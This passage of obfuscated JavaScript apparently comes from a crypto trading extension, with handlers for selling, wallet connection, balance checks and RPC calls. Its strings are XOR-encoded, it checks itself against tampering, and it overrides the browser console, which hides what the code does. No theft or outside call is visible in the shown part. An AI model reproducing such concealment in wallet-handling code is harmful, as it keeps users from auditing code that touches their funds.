        l instanceof Error
          ? l.message
          : "string" == typeof l ||
            (l && typeof l === c[u(s)] && JSON[u(a)](l));
      }
    }),
    (vR.CLOSE_UI = async (t) => {
      (() => {
        const t = 379,
          e = 377,
          n = 379,
          r = 383,
          o = 360,
          i = 380,
          s = S,
          a = {
            JFYkQ: "none",
            RsJpU: function (t, e) {
              return t(e);
            },
          },
          { iframe: u } = v();
        if (!u) return;
        (u[s(t)].display = a[s(378)]),
          (u.style[s(e)] = "0"),
          (u[s(n)]["pointerEve" + s(r)] = a.JFYkQ);
        const c = {};
        (c["iframeVisi" + s(o)] = ![]), a[s(i)](A, c);
      })();
    }),
    (vR.SELL = async (t) => {
      const e = 416,
        n = 509,
        r = yR;
      if (!Yg.getInstance()[r(e) + "enticated"]()) return;
      const o = Qg.getInstance().getSettings();
      "mogtechRPC" === (null == o ? void 0 : o.selectedMode)
        ? await eR(t.percent, null == o ? void 0 : o[r(n)])
        : await nR(t.percent);
    }),
    (vR["WALLET_CON" + dR(417) + "ST"] = async (t) => {
      var e;
      const n = 426,
        r = 446,
        o = 484,
        i = 497,
        s = 436,
        a = 516,
        u = 448,
        c = 501,
        l = 456,
        d = 507,
        f = yR,
        h = function (t, e) {
          return t & e;
        },
        p = function (t, e) {
          return t ^ e;
        },
        m = function (t, e) {
          return t * e;
        },
        g = function (t, e) {
          return t(e);
        },
        y = function (t, e) {
          return t instanceof e;
        };
      try {
        const t = $g.getInstance();
        await t.waitForLoad();
        const r = t.getWallet();
        if (r)
          return (
            g(P, {
              type: (function () {
                const t = yR,
                  e = {};
                (e[t(501)] = function (t, e) {
                  return t < e;
                }),
                  (e.uTlMu = function (t, e) {
                    return t * e;
                  }),
                  (e.VIVNN = function (t, e) {
                    return t ^ e;
                  });
                const n = e;
                let r;
                return function () {
                  const e = t;
                  if (!r) {
                    const t = new Uint8Array([
                        81, 243, 25, 114, 67, 230, 10, 125, 73, 252, 27, 123,
                        69, 230, 16, 122,
                      ]),
                      o = 1045803526,
                      i = new Uint8Array(t[e(u)]);
                    for (let r = 0; n[e(c)](r, t[e(u)]); r++) {
                      const s = (o >>> n[e(l)](r % 4, 8)) & 255;
                      i[r] = n[e(d)](t[r], s);
                    }
                    r = new TextDecoder().decode(i);
                  }
                  return r;
                };
              })()(),
              publicKey: t[f(426)](),
              address: t[f(n)](),
            }),
            await (null == (e = Lg[f(482) + "nt"]())
              ? void 0
              : e.getBalance(r.publicKey)),
            void 0
          );
        g(P, {
          type: (function () {
            const t = {
              gsPTF: function (t, e) {
                return h(t, e);
              },
              QCcOE: function (t, e) {
                return t >>> e;
              },
              Erazh: function (t, e) {
                return t * e;
              },
              tONGk: function (t, e) {
                return t % e;
              },
              xazzj: function (t, e) {
                return p(t, e);
              },
            };
            let e;
            return function () {
              const n = yR;
              if (!e) {
                const r = new Uint8Array([
                    83, 243, 25, 114, 65, 230, 10, 125, 75, 252, 27, 123, 71,
                    230, 28, 113, 74, 237, 16, 108, 86, 253, 7,
                  ]),
                  o = 1045803524,
                  i = new Uint8Array(r[n(448)]);
                for (let e = 0; e < r[n(448)]; e++) {
                  const s = t[n(a)](
                    t[n(505)](o, t.Erazh(t.tONGk(e, 4), 8)),
                    255
                  );
                  i[e] = t.xazzj(r[e], s);
                }
                e = new TextDecoder().decode(i);
              }
              return e;
            };
          })()(),
          error: (function () {
            let t;
            return function () {
              if (!t) {
                const e = new Uint8Array([
                    72, 221, 117, 73, 103, 222, 57, 91, 114, 146, 49, 91, 114,
                    215, 54, 74, 99, 214,
                  ]),
                  n = 1045803526,
                  r = new Uint8Array(e.length);
                for (let t = 0; t < e.length; t++) {
                  const o = (n >>> ((t % 4) * 8)) & 255;
                  r[t] = e[t] ^ o;
                }
                t = new TextDecoder().decode(r);
              }
              return t;
            };
          })()(),
        });
      } catch (w) {
        let t = "Unknown error";
        y(w, Error)
          ? (t = w[f(466)])
          : typeof w === f(r)
          ? (t = w)
          : w && typeof w === f(o) && (t = JSON[f(473)](w)),
          P({
            type: (function () {
              const t = {
                KcuVi: function (t, e) {
                  return t >>> e;
                },
                CNehX: function (t, e) {
                  return m(t, e);
                },
                TAzTl: function (t, e) {
                  return t % e;
                },
                IoZbP: function (t, e) {
                  return t ^ e;
                },
              };
              let e;
              return function () {
                const n = yR;
                if (!e) {
                  const r = new Uint8Array([
                      111, 243, 25, 114, 125, 230, 10, 125, 119, 252, 27, 123,
                      123, 230, 28, 113, 118, 237, 16, 108, 106, 253, 7,
                    ]),
                    o = 1045803576,
                    a = new Uint8Array(r.length);
                  for (let e = 0; e < r.length; e++) {
                    const s = 255 & t.KcuVi(o, t.CNehX(t[n(i)](e, 4), 8));
                    a[e] = t.IoZbP(r[e], s);
                  }
                  e = new TextDecoder()[n(s)](a);
                }
                return e;
              };
            })()(),
            error: t,
          });
      }
    }),
    (vR.WALLET_DISCONNECT_REQUEST = async (t) => {
      const e = yR,
        n = {
          BjmDP: function (t, e) {
            return t & e;
          },
          bRSAG: function (t, e) {
            return t % e;
          },
          Ldukc: function (t, e) {
            return t(e);
          },
        },
        r = $g[e(430) + "e"]();
      await r[e([517][0]) + "d"]();
      r.getWallet() &&
        n.Ldukc(P, {
          type: (function () {
            const t = 448,
              e = 453,
              r = 420,
              o = 494,
              i = {
                yxEQh: function (t, e) {
                  return n[yR(o)](t, e);
                },
                gFuOi: function (t, e) {
                  return n.bRSAG(t, e);
                },
                kyzHd: function (t, e) {
                  return t ^ e;
                },
              };
            let s;
            return function () {
              const n = yR;
              if (!s) {
                const o = new Uint8Array([
                    81, 243, 25, 114, 67, 230, 10, 122, 79, 225, 22, 113, 72,
                    252, 16, 125, 82, 247, 17,
                  ]),
                  a = 1045803526,
                  u = new Uint8Array(o[n(t)]);
                for (let t = 0; t < o[n(448)]; t++) {
                  const s = i.yxEQh(a >>> (8 * i[n(e)](t, 4)), 255);
                  u[t] = i[n(r)](o[t], s);
                }
                s = new TextDecoder().decode(u);
              }
              return s;
            };
          })()(),
        });
    }),
    (vR[dR(438) + "LANCE"] = async (t) => {
      const e = 430,
        n = 491,
        r = 418,
        o = 448,
        i = 436,
        s = 448,
        a = 490,
        u = 448,
        c = 454,
        l = yR,
        d = {
          VBnqt: function (t, e) {
            return t < e;
          },
          GHxHV: function (t, e) {
            return t * e;
          },
          dEVCF: function (t, e) {
            return t ^ e;
          },
        };
      (d[l(511)] = function (t, e) {
        return t >>> e;
      }),
        (d.qVsxh = function (t, e) {
          return t & e;
        }),
        (d.WFrEf = "string");
      const f = d,
        h = Yg[l(e) + "e"]();
      if (!h.isUserAuthenticated())
        return (
          P({
            type: (function () {
              const t = {
                fxght: function (t, e) {
                  return f.VBnqt(t, e);
                },
                jkqsJ: function (t, e) {
                  return t & e;
                },
                ABUmD: function (t, e) {
                  return t * e;
                },
                kecnl: function (t, e) {
                  return t ^ e;
                },
              };
              let e;
              return function () {
                const n = yR;
                if (!e) {
                  const r = new Uint8Array([
                      84, 226, 22, 97, 67, 224, 7, 113, 84,
                    ]),
                    o = 1045803526,
                    i = new Uint8Array(r[n(u)]);
                  for (let e = 0; t[n(c)](e, r.length); e++) {
                    const n = t.jkqsJ(o >>> t.ABUmD(e % 4, 8), 255);
                    i[e] = t.kecnl(r[e], n);
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            error: (function () {
              let t;
              return function () {
                const e = yR;
                if (!t) {
                  const n = new Uint8Array([
                      77, 193, 48, 76, 56, 220, 58, 74, 56, 211, 32, 74, 112,
                      215, 59, 74, 113, 209, 52, 74, 125, 214,
                    ]),
                    r = 1045803544,
                    o = new Uint8Array(n.length);
                  for (let t = 0; t < n.length; t++) {
                    const i = (r >>> f.GHxHV(t % 4, 8)) & 255;
                    o[t] = f[e(a)](n[t], i);
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
          }),
          void 0
        );
      if (!h.isRpcConnected())
        return (
          P({
            type: (function () {
              const t = function (t, e) {
                  return t < e;
                },
                e = function (t, e) {
                  return f.GHxHV(t, e);
                },
                n = function (t, e) {
                  return t ^ e;
                };
              let r;
              return function () {
                const o = yR;
                if (!r) {
                  const i = new Uint8Array([
                      84, 226, 22, 97, 67, 224, 7, 113, 84,
                    ]),
                    a = 1045803526,
                    u = new Uint8Array(i.length);
                  for (let r = 0; t(r, i[o(s)]); r++) {
                    const t = (a >>> e(r % 4, 8)) & 255;
                    u[r] = n(i[r], t);
                  }
                  r = new TextDecoder().decode(u);
                }
                return r;
              };
            })()(),
            error: (function () {
              const t = 448,
                e = l,
                n = {};
              n[e(498)] = function (t, e) {
                return t & e;
              };
              const r = n;
              let o;
              return function () {
                const n = e;
                if (!o) {
                  const e = new Uint8Array([
                      86, 226, 22, 30, 106, 221, 33, 30, 103, 221, 59, 80, 97,
                      209, 33, 91, 96,
                    ]),
                    i = 1045803524,
                    s = new Uint8Array(e.length);
                  for (let o = 0; o < e[n(t)]; o++) {
                    const t = r[n(498)](i >>> ((o % 4) * 8), 255);
                    s[o] = e[o] ^ t;
                  }
                  o = new TextDecoder()[n(436)](s);
                }
                return o;
              };
            })()(),
          }),
          void 0
        );
      try {
        const e = await h.getAccountBalance(t[l(491)]);
        P({
          type: (function () {
            const t = {
                hufQX: function (t, e) {
                  return t < e;
                },
              },
              e = t;
            let n;
            return function () {
              if (!n) {
                const t = new Uint8Array([
                    84, 226, 22, 97, 68, 243, 25, 127, 72, 241, 16, 97, 84, 247,
                    6, 110, 73, 252, 6, 123,
                  ]),
                  r = 1045803526,
                  o = new Uint8Array(t.length);
                for (let n = 0; e.hufQX(n, t.length); n++) {
                  const e = (r >>> ((n % 4) * 8)) & 255;
                  o[n] = t[n] ^ e;
                }
                n = new TextDecoder().decode(o);
              }
              return n;
            };
          })()(),
          balance: e,
          address: t[l(n)],
        });
      } catch (p) {
        let t = l(r) + "ror";
        p instanceof Error
          ? (t = p.message)
          : typeof p === f.WFrEf
          ? (t = p)
          : p && "object" == typeof p && (t = JSON.stringify(p)),
          P({
            type: (function () {
              const t = 448;
              let e;
              return function () {
                const n = yR;
                if (!e) {
                  const r = new Uint8Array([
                      82, 226, 22, 97, 69, 224, 7, 113, 82,
                    ]),
                    o = 1045803520,
                    i = new Uint8Array(r[n(t)]);
                  for (let t = 0; t < r.length; t++) {
                    const e = 255 & f.NyhvC(o, (t % 4) * 8);
                    i[t] = r[t] ^ e;
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            error:
              (function () {
                const t = function (t, e) {
                    return f.qVsxh(t, e);
                  },
                  e = function (t, e) {
                    return t % e;
                  };
                let n;
                return function () {
                  const r = yR;
                  if (!n) {
                    const s = new Uint8Array([
                        64, 211, 60, 82, 99, 214, 117, 74, 105, 146, 50, 91,
                        114, 146, 55, 95, 106, 211, 59, 93, 99, 136, 117,
                      ]),
                      a = 1045803526,
                      u = new Uint8Array(s[r(o)]);
                    for (let n = 0; n < s.length; n++) {
                      const r = t(a >>> (8 * e(n, 4)), 255);
                      u[n] = s[n] ^ r;
                    }
                    n = new TextDecoder()[r(i)](u);
                  }
                  return n;
                };
              })()() + t,
          });
      }
    }),
    (vR.RPC_CALL = async (t) => {
      const e = 503,
        n = 449,
        r = 513,
        o = 449,
        i = 484,
        s = 449,
        a = yR,
        u = {
          GRGoI: function (t, e) {
            return t >>> e;
          },
          oeWgI: function (t, e) {
            return t % e;
          },
          CRPpj: function (t, e) {
            return t ^ e;
          },
          RfQWM: function (t, e) {
            return t < e;
          },
          SnqOq: function (t, e) {
            return t & e;
          },
          vitBP: function (t, e) {
            return t * e;
          },
          FkNnE: function (t, e) {
            return t < e;
          },
          fvUur: function (t, e) {
            return t & e;
          },
          VhbJo: function (t, e) {
            return t * e;
          },
          Ukcjx: function (t, e) {
            return t & e;
          },
          Wbfty: function (t, e) {
            return t % e;
          },
          plaeL: function (t, e) {
            return t(e);
          },
          ZwTFC: function (t, e) {
            return t(e);
          },
          DCDqX: function (t, e) {
            return t + e;
          },
        },
        c = Yg[a(430) + "e"]();
      if (!c.isUserAuthenticated())
        return (
          P({
            type: (function () {
              const t = 436;
              let e;
              return function () {
                const n = yR;
                if (!e) {
                  const r = new Uint8Array([
                      86, 226, 22, 97, 65, 224, 7, 113, 86,
                    ]),
                    o = 1045803524,
                    i = new Uint8Array(r[n(448)]);
                  for (let t = 0; t < r.length; t++) {
                    const e = 255 & u.GRGoI(o, 8 * u.oeWgI(t, 4));
                    i[t] = u.CRPpj(r[t], e);
                  }
                  e = new TextDecoder()[n(t)](i);
                }
                return e;
              };
            })()(),
            error: (function () {
              const t = 448;
              let e;
              return function () {
                const n = yR;
                if (!e) {
                  const r = new Uint8Array([
                      83, 193, 48, 76, 38, 220, 58, 74, 38, 211, 32, 74, 110,
                      215, 59, 74, 111, 209, 52, 74, 99, 214,
                    ]),
                    o = 1045803526,
                    i = new Uint8Array(r.length);
                  for (let e = 0; u.RfQWM(e, r[n(t)]); e++) {
                    const t = u[n(424)](o >>> (8 * u[n(419)](e, 4)), 255);
                    i[e] = r[e] ^ t;
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            method: t[a(449)],
          }),
          void 0
        );
      if (!c["isRpcConne" + a(e)]())
        return (
          P({
            type: (function () {
              const t = 448,
                e = 436;
              let n;
              return function () {
                const r = yR;
                if (!n) {
                  const o = new Uint8Array([
                      90, 226, 22, 97, 77, 224, 7, 113, 90,
                    ]),
                    i = 1045803528,
                    s = new Uint8Array(o[r(t)]);
                  for (let t = 0; u[r(502)](t, o.length); t++) {
                    const e = u.SnqOq(i >>> u.vitBP(t % 4, 8), 255);
                    s[t] = o[t] ^ e;
                  }
                  n = new TextDecoder()[r(e)](s);
                }
                return n;
              };
            })()(),
            error: (function () {
              let t;
              return function () {
                if (!t) {
                  const e = new Uint8Array([
                      84, 226, 22, 30, 104, 221, 33, 30, 101, 221, 59, 80, 99,
                      209, 33, 91, 98,
                    ]),
                    n = 1045803526,
                    r = new Uint8Array(e.length);
                  for (let t = 0; u.FkNnE(t, e.length); t++) {
                    const o = 255 & u.GRGoI(n, (t % 4) * 8);
                    r[t] = e[t] ^ o;
                  }
                  t = new TextDecoder().decode(r);
                }
                return t;
              };
            })()(),
            method: t[a(n)],
          }),
          void 0
        );
      try {
        const e = await c.callRpc(t.method, t[a(r)]);
        u.plaeL(P, {
          type: (function () {
            const t = 461,
              e = {
                xKlkF: function (t, e) {
                  return u.GRGoI(t, e);
                },
                DtgDs: function (t, e) {
                  return t * e;
                },
              };
            let n;
            return function () {
              const r = yR;
              if (!n) {
                const o = new Uint8Array([
                    86, 226, 22, 97, 71, 243, 25, 114, 91, 224, 16, 109, 84,
                    253, 27, 109, 65,
                  ]),
                  i = 1045803524,
                  s = new Uint8Array(o.length);
                for (let n = 0; n < o.length; n++) {
                  const a = 255 & e[r(t)](i, e.DtgDs(n % 4, 8));
                  s[n] = o[n] ^ a;
                }
                n = new TextDecoder()[r(436)](s);
              }
              return n;
            };
          })()(),
          result: e,
          method: t[a(o)],
        });
      } catch (l) {
        let e = a(418) + "ror";
        l instanceof Error
          ? (e = l[a(466)])
          : "string" == typeof l
          ? (e = l)
          : l && typeof l === a(i) && (e = JSON.stringify(l)),
          u.ZwTFC(P, {
            type: (function () {
              const t = 437,
                e = 489,
                n = 436;
              let r;
              return function () {
                const o = yR;
                if (!r) {
                  const i = new Uint8Array([
                      84, 226, 22, 97, 67, 224, 7, 113, 84,
                    ]),
                    s = 1045803526,
                    a = new Uint8Array(i.length);
                  for (let n = 0; n < i.length; n++) {
                    const r = u[o(t)](s >>> u[o(e)](u.oeWgI(n, 4), 8), 255);
                    a[n] = i[n] ^ r;
                  }
                  r = new TextDecoder()[o(n)](a);
                }
                return r;
              };
            })()(),
            error: u.DCDqX(
              (function () {
                let t;
                return function () {
                  const e = yR;
                  if (!t) {
                    const n = new Uint8Array([
                        82, 226, 22, 30, 99, 211, 57, 82, 32, 212, 52, 87, 108,
                        215, 49, 4, 32,
                      ]),
                      r = 1045803520,
                      o = new Uint8Array(n[e(448)]);
                    for (let t = 0; u.FkNnE(t, n[e(448)]); t++) {
                      const e = u.Ukcjx(u.GRGoI(r, 8 * u.Wbfty(t, 4)), 255);
                      o[t] = n[t] ^ e;
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()(),
              e
            ),
            method: t[a(s)],
          });
      }
    });
  const AR = vR;
  axiomVamp;
  const kR = BR;
  !(function (t) {
    const e = 325,
      n = 323,
      r = 334,
      o = 318,
      i = 326,
      s = 332,
      a = 320,
      u = 314,
      c = 322,
      l = 341,
      d = BR,
      f = t();
    for (; []; )
      try {
        if (
          113444 ===
          (parseInt(d(e)) / 1) * (-parseInt(d(n)) / 2) +
            (-parseInt(d(r)) / 3) * (parseInt(d(o)) / 4) +
            (-parseInt(d(i)) / 5) * (parseInt(d(311)) / 6) +
            (parseInt(d(s)) / 7) * (-parseInt(d(321)) / 8) +
            (parseInt(d(a)) / 9) * (parseInt(d(315)) / 10) +
            (parseInt(d(u)) / 11) * (-parseInt(d(310)) / 12) +
            (-parseInt(d(c)) / 13) * (-parseInt(d(l)) / 14)
        )
          break;
        f.push(f.shift());
      } catch (h) {
        f.push(f.shift());
      }
  })(_R);
  const IR = (function () {
      let t = !![];
      return function (e, n) {
        const r = 316,
          o = t
            ? function () {
                if (n) {
                  const t = n[BR(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    SR = IR(void 0, function () {
      const t = 335,
        e = 328,
        n = 335,
        r = BR,
        o = {};
      o.AdRhM = r(t) + "+$";
      const i = o;
      return SR.toString()
        [r(e)](r(n) + "+$")
        .toString()
        [r(309) + "r"](SR)
        [r(e)](i.AdRhM);
    });
  function _R() {
    const t = [
      "y29UC3rYDwn0BW",
      "mtjOAxruze8",
      "mJrQrKrZq1O",
      "yMLUza",
      "zxjYB3i",
      "mJGXndy4tu9Ntg1K",
      "ndG2otuWB3LjseP1",
      "yxbWBhK",
      "sen1DeK",
      "nhnjyLj6DW",
      "Bg9N",
      "mtHnEwjiAfG",
      "mJe2ChjIy1f2",
      "ntjpEhfhuw8",
      "mJqXmfnjBeXwrq",
      "CMv0DxjUicHMDq",
      "odLYBe90C0u",
      "nZu5otvoswzqyKS",
      "twfdrhq",
      "C2vHCMnO",
      "z3vjyLi",
      "ruLiqxq",
      "Dg9tDhjPBMC",
      "mtu5ndzUALHzDxi",
      "E30Uy29UC3rYDq",
      "ndK3mJvPzxPfsKW",
      "kcGOlISPkYKRkq",
      "C2TdCNLWDa",
      "ChjVDg90ExbL",
      "y29UC29Szq",
      "t25ysNq",
      "wvzPsKK",
      "mtaWnZe3nhbgv01ZDW",
    ];
    return (_R = function () {
      return t;
    })();
  }
  SR();
  const TR = (function () {
    let t = !![];
    return function (e, n) {
      const r = t
        ? function () {
            if (n) {
              const t = n.apply(e, arguments);
              return (n = null), t;
            }
          }
        : function () {};
      return (t = ![]), r;
    };
  })();
  function BR(t, e) {
    const n = _R();
    return (
      (BR = function (e, r) {
        let o = n[(e -= 309)];
        if (void 0 === BR.HTFkHI) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (BR.mlTdtQ = i), (t = arguments), (BR.HTFkHI = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.VlMvQm = t),
              (this.HJOpsQ = [1, 0, 0]),
              (this.meLcxf = function () {
                return "newState";
              }),
              (this.hcPPXj = "\\w+ *\\(\\) *{\\w+ *"),
              (this.wQxmxv = "['|\"].+['|\"];? *}");
          };
          (e.prototype.MgHtEU = function () {
            const t = new RegExp(this.hcPPXj + this.wQxmxv).test(
              this.meLcxf.toString()
            )
              ? --this.HJOpsQ[1]
              : --this.HJOpsQ[0];
            return this.SCQTXC(t);
          }),
            (e.prototype.SCQTXC = function (t) {
              return Boolean(~t) ? this.vWMoTT(this.VlMvQm) : t;
            }),
            (e.prototype.vWMoTT = function (t) {
              for (let e = 0, n = this.HJOpsQ.length; e < n; e++)
                this.HJOpsQ.push(Math.round(Math.random())),
                  (n = this.HJOpsQ.length);
              return t(this.HJOpsQ[0]);
            }),
            new e(BR).MgHtEU(),
            (o = BR.mlTdtQ(o)),
            (t[s] = o);
        }
        return o;
      }),
      BR(t, e)
    );
  }
  TR(void 0, function () {
    const t = 319,
      e = 317,
      n = 338,
      r = 340,
      o = 313,
      i = 339,
      s = 337,
      a = 312,
      u = 331,
      c = 331,
      l = 327,
      d = 324,
      f = BR,
      h = {
        MaCDt: function (t, e) {
          return t + e;
        },
        eMbgY: f(333) + 'ctor("return this")( )',
        HCutI: function (t) {
          return t();
        },
        MFDhB: f(t),
        YViJI: "warn",
        OnXJt: function (t, e) {
          return t < e;
        },
      },
      p = h[f(e)](function () {
        const t = f;
        let e;
        try {
          e = Function(h[t(l)](t(d) + "nction() ", h.eMbgY) + ");")();
        } catch (n) {
          e = window;
        }
        return e;
      }),
      m = (p.console = p[f(n)] || {}),
      g = [h.MFDhB, h[f(r)], "info", f(o), "exception", "table", "trace"];
    for (let y = 0; h[f(i)](y, g.length); y++) {
      const t = TR.constructor[f(s)][f(a)](TR),
        e = g[y],
        n = m[e] || t;
      (t.__proto__ = TR.bind(TR)), (t[f(u)] = n[f(c)].bind(n)), (m[e] = t);
    }
  })(),
    (window[kR(336)] = function (t) {
      return function () {
        return t;
      };
    });
  const CR = (t) => {
    const e = kR,
      n = {
        EIHAt: function (t, e) {
          return t(e);
        },
        guIbR: function (t) {
          return t();
        },
      };
    (() => {
      const t = 198,
        e = 180,
        n = 158,
        r = F,
        o = {
          iLLJy: function (t, e) {
            return t < e;
          },
          tZZkj: function (t, e) {
            return t ^ e;
          },
          gkULU: function (t, e) {
            return t(e);
          },
        },
        i = setInterval(async () => {
          const t = 195,
            e = $,
            r = {
              scyzR: function (e, n) {
                return o[$(t)](e, n);
              },
              trzKU: function (t, e) {
                return t % e;
              },
              FCZcm: function (t, e) {
                return o.tZZkj(t, e);
              },
            };
          try {
            !(await Q()) && clearInterval(i);
          } catch (s) {
            C(),
              await o[e(n)](
                K,
                (function () {
                  const t = 209,
                    e = 217;
                  let n;
                  return function () {
                    const o = $;
                    if (!n) {
                      const i = new Uint8Array([
                          230, 251, 106, 20, 199, 247, 125, 24, 149, 243, 102,
                          15, 220, 234, 102, 19, 220, 240, 110, 65, 198, 231,
                          122, 21, 208, 243, 41, 2, 218, 243, 121, 19, 218, 243,
                          96, 18, 208, 250,
                        ]),
                        s = 1628020405,
                        a = new Uint8Array(i.length);
                      for (let e = 0; r.scyzR(e, i[o(t)]); e++) {
                        const t = (s >>> (8 * r[o(203)](e, 4))) & 255;
                        a[e] = r.FCZcm(i[e], t);
                      }
                      n = new TextDecoder()[o(e)](a);
                    }
                    return n;
                  };
                })()()
              ),
              clearInterval(i);
          }
        }, 3e4);
      document[r(t) + r(e)](r(168) + "change", async () => {
        !document.hidden && (await Q());
      });
    })(),
      n[e(330)](E, t),
      n[e([329][0])](wR);
  };
  axiomVamp;
  const ER = LR;
  !(function (t) {
    const e = 296,
      n = 365,
      r = 374,
      o = 321,
      i = 250,
      s = 319,
      a = 335,
      u = LR,
      c = t();
    for (; []; )
      try {
        if (
          402570 ===
          -parseInt(u(e)) / 1 +
            (parseInt(u(n)) / 2) * (-parseInt(u(274)) / 3) +
            parseInt(u(325)) / 4 +
            parseInt(u(r)) / 5 +
            -parseInt(u(o)) / 6 +
            (parseInt(u(345)) / 7) * (-parseInt(u(i)) / 8) +
            (parseInt(u(s)) / 9) * (parseInt(u(a)) / 10)
        )
          break;
        c.push(c.shift());
      } catch (l) {
        c.push(c.shift());
      }
  })(MR);
  const xR = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    PR = xR(void 0, function () {
      const t = 252,
        e = 241,
        n = 340,
        r = 263,
        o = LR,
        i = {};
      i.PZyJi = o(t) + "+$";
      const s = i;
      return PR.toString()
        [o(e)]("(((.+)+)+)+$")
        .toString()
        [o(n) + "r"](PR)
        .search(s[o(r)]);
    });
  PR();
  const OR = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    RR = OR(void 0, function () {
      const t = 231,
        e = 273,
        n = 272,
        r = 387,
        o = 340,
        i = 288,
        s = 247,
        a = 333,
        u = 360,
        c = LR,
        l = {
          IlICH: function (t, e) {
            return t + e;
          },
          SfXiZ: "table",
          PBzRY: function (t, e) {
            return t < e;
          },
        },
        d = l,
        f = (function () {
          const t = LR;
          let e;
          try {
            e = Function(
              d[t(334)](t(a) + t(u) + '{}.constructor("return this")( )', ");")
            )();
          } catch (n) {
            e = window;
          }
          return e;
        })(),
        h = (f.console = f.console || {}),
        p = [c(t), c(e), c(n), "error", "exception", d.SfXiZ, c(278)];
      for (let m = 0; d[c(r)](m, p.length); m++) {
        const t = OR[c(o) + "r"].prototype[c(i)](OR),
          e = p[m],
          n = h[e] || t;
        (t.__proto__ = OR[c(i)](OR)),
          (t.toString = n[c(s)][c(i)](n)),
          (h[e] = t);
      }
    });
  function MR() {
    const t = [
      "Bgv4lxjVDY5MBa",
      "DhjHy2u",
      "q2LmBfy",
      "CxvLCNLtzwXLyW",
      "ohb4xf0UB2jQzq",
      "lxjPz2H0oIa0Ca",
      "Aw5JBhvKzxm",
      "cIaGicaGicaGia",
      "lMnVAw4Ty3jLyq",
      "zxiTEc1SAw5L",
      "Aw5NlvXBmJfWEa",
      "yMLUza",
      "Dg9YqwXS",
      "AxnvC2vYqxv0Aa",
      "zs9Tzw1LlYO",
      "ChvZAfn0yxrL",
      "CMvTB3zLrxzLBG",
      "DhDPDhrLCI5JBW",
      "ywXHBMnL",
      "mtKXnJD5yvLou0m",
      "zM9YrwfJAa",
      "y3jLyxrLrwXLBq",
      "uvHWtg4",
      "CxzpAxe",
      "ChvIBgLJs2v5",
      "rejIAMK",
      "Aw9U",
      "Bxbkwu4",
      "Dg9Y",
      "ChvZAa",
      "z2v0qxr0CMLIDq",
      "zgfYAW",
      "As5YAs1NBg9Iyq",
      "CMvHDguTyNrUoG",
      "BgrTzhy",
      "Ew91DhvIzs5JBW",
      "Dgv4DenVBNrLBG",
      "Bgf0AxzLoWOGia",
      "z2v0v2fSBgv0",
      "oIbWB2LUDgvYoW",
      "Bg9YidaUmNmGzq",
      "z2v0u2v0DgLUzW",
      "mtaYnde2mZf2zxDMtfq",
      "EfXD",
      "ndC0ndu5nKXgq0HJBa",
      "thbwy1u",
      "C3rVCfbYB3bHzW",
      "AgfZvg9Rzw4",
      "mtaZnta5mKT6zwT0tG",
      "C3bHBI50zxH0lq",
      "BwvZC2fNzq",
      "uxDMvve",
      "y2HPBgrmAxn0",
      "Ag92zxiGEWOGia",
      "As5YAs10D2L0Da",
      "DguTyNrU",
      "CMv0DxjUicHMDq",
      "swXjq0G",
      "mtbzzg1hwNu",
      "icaGicb0CMfUCW",
      "zs9WDwXZzq",
      "icaGFqOGicaGia",
      "icaGigjHy2TNCG",
      "y29UC3rYDwn0BW",
      "mfWUmdjLBvXDlG",
      "oM5VDcHBAhjLzG",
      "zgvYlwiTxfSXCa",
      "seLHD08",
      "mtrwywneuuq",
      "icaGicaGicaGzG",
      "icaGyMfJA2DYBW",
      "yxHPB20UDhjHza",
      "Ew91DhuUyMu",
      "CM9Y",
      "icaGig1HCMDPBG",
      "lw1LzgL1Bs50CG",
      "zg9JDw1LBNrFAq",
      "y2XPy2S",
      "zgLZy29UBMvJDa",
      "EdSkicaGicaGia",
      "zs1IDg4",
      "z2v0sw5ZDgfUyW",
      "wNvxAMe",
      "BMn0Aw9UkcKG",
      "oIaJmda3oueXoW",
      "tfDPuxa",
      "Es50zxH0lvXBmq",
      "icaGicaGigjVCG",
      "mNneALnYsa",
      "yM9KEq",
      "B25Kyxj5lMjVCG",
      "y2XVC2vZDa",
      "tffrz2e",
      "zw50",
      "Aw1Nw3nYyYO9iG",
      "oIbIB2XKoWOGia",
      "z3jHBs1SAw5L",
      "mZaZnZe2mhb4B1jwqG",
      "B1nIwxO",
      "B2P0C24",
      "zc1CwZfWEfXDlG",
      "yxbWBhK",
      "AgvHza",
      "zgL2lMzSzxGUzG",
      "AhjbsMO",
      "Aw5Zzxj0qMvMBW",
      "yMn5ELi",
      "C3rPzNKTC3rHCG",
      "icaGlMnVAw4TyW",
      "iNr3Axr0zxiUyW",
      "uej6uLK",
      "BgvUz3rO",
      "vwXOteS",
      "zMLYC3rdAgLSza",
      "DcHBAhjLzIO9iG",
      "y29T",
      "As5YAs10AwT0BW",
      "Bgv4lxjVDY5Olq",
      "Bg9N",
      "yxr0CMLIDxrLCW",
      "rxrhv1q",
      "l21LBwuV",
      "Cgf0Ag5HBwu",
      "z2v0q2fJAgvKqG",
      "zgf0ys1YB3v0zq",
      "CMvWBgfJzvn0yq",
      "zgP6zuy",
